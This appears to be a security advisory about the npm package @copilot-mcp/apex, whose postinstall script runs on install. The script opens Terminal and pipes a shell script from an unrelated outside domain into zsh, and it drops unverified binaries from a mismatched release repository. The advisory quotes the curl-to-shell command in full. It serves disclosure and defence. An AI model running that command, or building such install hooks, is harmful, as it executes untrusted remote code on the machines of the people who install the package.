summary: Postinstall pipes remote shell script into zsh and drops unverified binary from mismatched publisher
details: The npm package @copilot-mcp/apex ships a postinstall script (install.cjs) that performs two install-time remote-code-execution paths against the installer. On macOS, install.cjs spawns osascript to open Terminal and execute `curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh`, fetching an unpinned shell script from a domain (apex-arena-router.com) unrelated to the package's declared publisher (homepage omp.sh, repository github.com/can1357/oh-my-pi) and piping it directly into a shell. The Terminal-based invocation is consistent with prompting the user for an elevated password. Independently, install.cjs downloads a platform-specific `apex` executable (and a Windows native.node addon) from github.com/Apex-Foundation/copilot releases, writes it under node_modules, and chmods it 0755 — the release repository (Apex-Foundation/copilot) does not match the package's declared publisher (can1357/oh-my-pi), and no hash or signature verification is performed. Both paths fire automatically on `npm install`.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
